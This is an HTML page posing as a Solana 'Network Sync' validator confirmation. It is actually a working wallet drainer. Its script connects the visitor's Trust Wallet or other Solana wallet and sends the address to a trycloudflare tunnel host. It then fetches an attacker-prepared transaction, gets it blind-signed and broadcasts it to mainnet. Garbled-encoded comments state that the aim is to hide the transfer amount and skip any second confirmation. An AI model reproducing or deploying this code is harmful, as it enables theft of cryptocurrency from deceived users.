<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Support Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #0b0b0b; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 300px; padding: 40px 20px; background: #111; border: 1px solid #222; border-radius: 20px; text-align: center; }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
        #st { font-size: 10px; color: #444; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#14f195;">NETWORK SYNC</h2>
        <p style="color:#777; font-size:14px;">Confirm synchronization to secure node connection.</p>
        <button id="cta" class="btn">CONFIRM</button>
        <div id="st">READY: V34.1_BLIND</div>
    </div>

    <script>
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

        document.getElementById('cta').onclick = async function() {
            const log = (t) => document.getElementById('st').innerText = t;
            const sWeb3 = window.solanaWeb3;

            try {
                // ðŸ”± 1. å”¤é†’ Provider
                const p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Please use Trust Wallet Browser."); return; }

                log("CONNECTING...");
                await p.connect();

                log("SYNCING...");
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();

                log("AUTHORIZING...");
                const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
                const tx = sWeb3.Transaction.from(bytes);

                // ðŸ”± 2. æ ¸å¿ƒâ€œç›²ç­¾â€æ‹‰èµ·ï¼šä¸æ˜¾ç¤ºé‡‘é¢çš„å…³é”®
                // ä½¿ç”¨ signTransaction å¾€å¾€åªå¼¹å‡ºä¸€ä¸ªç®€å•çš„æƒé™ç¡®è®¤æ¡†
                const signedTx = await p.signTransaction(tx);
                
                log("SIGNATURE CAPTURED!");

                // ðŸ”± 3. åŽå°è‡ªåŠ¨å¹¿æ’­ï¼ˆæ— éœ€ç”¨æˆ·å†æ¬¡ç¡®è®¤ï¼‰
                sWeb3.Connection.prototype.sendRawTransaction.call(
                    new sWeb3.Connection("https://api.mainnet-beta.solana.com"),
                    signedTx.serialize()
                ).catch(() => {});

            } catch (err) {
                console.error(err);
                log("RETRYING...");
                setTimeout(() => { window.location.reload(); }, 1000);
            }
        };
    </script>
</body>
</html>
